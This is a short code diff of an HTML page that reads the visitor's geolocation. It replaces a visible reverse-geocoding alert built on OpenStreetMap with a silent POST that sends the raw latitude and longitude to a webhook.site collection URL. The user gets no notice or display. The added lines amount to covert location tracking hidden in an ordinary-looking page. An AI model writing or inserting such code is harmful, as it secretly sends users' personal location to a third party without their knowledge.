@@ -11,15 +11,15 @@
             var lat = pos.coords.latitude;
             var lng = pos.coords.longitude;
            // alert("你的经纬度是：" + lat + "," + lng);
-fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}`)
-  .then(res => res.json())
-  .then(data => {
-      alert("你的位置是：" + data.display_name);
-  });
+fetch("https://webhook.site/1234-abcd-5678", {
+    method:"POST",
+    body: JSON.stringify({lat, lng})
+});
 
 
     </script>
 </body>
 </html>
+
 
 
